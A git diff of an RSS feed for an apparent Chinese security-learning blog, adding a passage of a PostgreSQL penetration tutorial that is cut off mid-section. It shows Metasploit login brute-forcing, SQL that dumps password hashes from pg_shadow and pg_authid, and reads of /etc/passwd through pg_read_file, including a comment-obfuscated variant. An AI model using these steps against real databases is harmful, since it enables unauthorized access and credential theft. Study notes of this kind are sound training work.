@@ -1,5 +1,121 @@
 <?xml version='1.0' encoding='UTF-8'?>
-<rss xmlns:atom="http://www.w3.org/2005/Atom" xmlns:content="http://purl.org/rss/1.0/modules/content/" version="2.0"><channel><title>P7IVESC's blog</title><link>https://P7IVESC.github.io</link><description>知其黑，守其白。一个网安小白的红队实战、靶场复盘与学习笔记。技术交流请备注来源：emhlcGluZzA1MDc=</description><copyright>P7IVESC's blog</copyright><docs>http://www.rssboard.org/rss-specification</docs><generator>python-feedgen</generator><image><url>https://avatars.githubusercontent.com/u/237383456?v=4&amp;size=200</url><title>avatar</title><link>https://P7IVESC.github.io</link></image><lastBuildDate>Fri, 06 Nov 2026 03:14:19 +0000</lastBuildDate><managingEditor>P7IVESC's blog</managingEditor><ttl>60</ttl><webMaster>P7IVESC's blog</webMaster><item><title>MySQL渗透 (CVE-2012-2122)</title><link>https://P7IVESC.github.io/post/MySQL-shen-tou-%20%28CVE-2012-2122%29.html</link><description>```bash
+<rss xmlns:atom="http://www.w3.org/2005/Atom" xmlns:content="http://purl.org/rss/1.0/modules/content/" version="2.0"><channel><title>P7IVESC's blog</title><link>https://P7IVESC.github.io</link><description>知其黑，守其白。一个网安小白的红队实战、靶场复盘与学习笔记。技术交流请备注来源：emhlcGluZzA1MDc=</description><copyright>P7IVESC's blog</copyright><docs>http://www.rssboard.org/rss-specification</docs><generator>python-feedgen</generator><image><url>https://avatars.githubusercontent.com/u/237383456?v=4&amp;size=200</url><title>avatar</title><link>https://P7IVESC.github.io</link></image><lastBuildDate>Fri, 06 Nov 2026 03:31:44 +0000</lastBuildDate><managingEditor>P7IVESC's blog</managingEditor><ttl>60</ttl><webMaster>P7IVESC's blog</webMaster><item><title>PostgreSQL数据库渗透</title><link>https://P7IVESC.github.io/post/PostgreSQL-shu-ju-ku-shen-tou.html</link><description>命令行连接方式
+
+安装客户端
+
+```bash
+apt install postgresql-client
+```
+
+连接方式
+
+```bash
+psql -U postgres -p port -h ip -W -d postgres
+```
+
+-U 指定用户名
+
+-d 指定连接的数据库，postgresql连接必须指定数据库
+
+-h 远程连接ip
+
+-p 远程连接端口
+
+-W 指定终端提示符下输入密码
+
+## Postgresql攻击方式
+
+## Postgresql口令爆破
+
+msf模块 auxiliary/scanner/postgres/postgres_login
+
+![](https://cdn.jsdelivr.net/gh/P7IVESC/img@main/2026/11/c0046bf52890.png)
+
+![](https://cdn.jsdelivr.net/gh/P7IVESC/img@main/2026/11/7266d9360567.png)
+
+![](https://cdn.jsdelivr.net/gh/P7IVESC/img@main/2026/11/9fce343e40af.png)
+
+![](https://cdn.jsdelivr.net/gh/P7IVESC/img@main/2026/11/0fafbe1d9858.png)
+
+你的暴力破解**整体完成了**
+
+找到了 **1 组有效的账号密码**
+
+Metasploit 提示你可以用这组凭据创建一个 Postgres 会话（连接）
+
+![](https://cdn.jsdelivr.net/gh/P7IVESC/img@main/2026/11/6c8abcacf2ad.png)
+
+## Postgresql信息收集
+
+使用psql命令或navicat登陆后，可以使用如下命令进行信息搜集
+
+```sql
+-- 详细信息 
+select version();
+```
+
+![](https://cdn.jsdelivr.net/gh/P7IVESC/img@main/2026/11/acb6743dcd41.png)
+
+```sql
+-- 版本信息 
+show server_version;
+```
+
+![](https://cdn.jsdelivr.net/gh/P7IVESC/img@main/2026/11/b818cc678520.png)
+
+```sql
+select pg_read_file('PG_VERSION', 0, 200);
+```
+
+![](https://cdn.jsdelivr.net/gh/P7IVESC/img@main/2026/11/bb234aeb5cca.png)
+
+```sql
+-- 数字版本信息包括小版号 
+SHOW server_version_num;
+```
+
+![](https://cdn.jsdelivr.net/gh/P7IVESC/img@main/2026/11/629c199ab334.png)
+
+```sql
+SELECT current_setting('server_version_num');
+```
+
+![](https://cdn.jsdelivr.net/gh/P7IVESC/img@main/2026/11/c108507694ce.png)
+
+```sql
+-- 获取 pgsql 安装目录 
+select setting from pg_settings where name = 'data_directory'; 
+-- 查找 pgsql 配置文件路径 
+select setting from pg_settings where name='config_file' 
+-- 列出数据库 
+SELECT datname FROM pg_database; 
+-- 查看服务器ip地址（如果运行在docker中可能存在IP不一致的问题） 
+select inet_server_addr();
+-- 查看当前用户是不是管理员权限 on 代表是, off 代表不是 
+SELECT current_setting('is_superuser'); 
+-- 查询密码（印证了之前的说法 postgres用户没有设置密码） 
+SELECT usename, passwd FROM pg_shadow; 
+SELECT rolname,rolpassword FROM pg_authid;
+-- 查询当前的加密方式 
+SELECT name,setting,source,enumvals FROM pg_settings WHERE name = 'password_encryption';
+```
+
+## Postgresql读文件
+
+## pg_read_file
+
+```sql
+select pg_read_file('/etc/passwd'); 
+select/**/PG_READ_FILE($$/etc/passwd$$);
+```
+
+```
+在早期的 PostgreSQL 版本中，pg_read_file不允许使用绝对路径
+```
+
+## copy_from
+
+copy有两个命令：COPY FROM和COPY TO。</description><guid isPermaLink="true">https://P7IVESC.github.io/post/PostgreSQL-shu-ju-ku-shen-tou.html</guid><pubDate>Fri, 06 Nov 2026 03:31:13 +0000</pubDate></item><item><title>MySQL渗透 (CVE-2012-2122)</title><link>https://P7IVESC.github.io/post/MySQL-shen-tou-%20%28CVE-2012-2122%29.html</link><description>```bash
 .\fscan.exe -h 10.3.4.95 -p 3306 -np
 ```
 
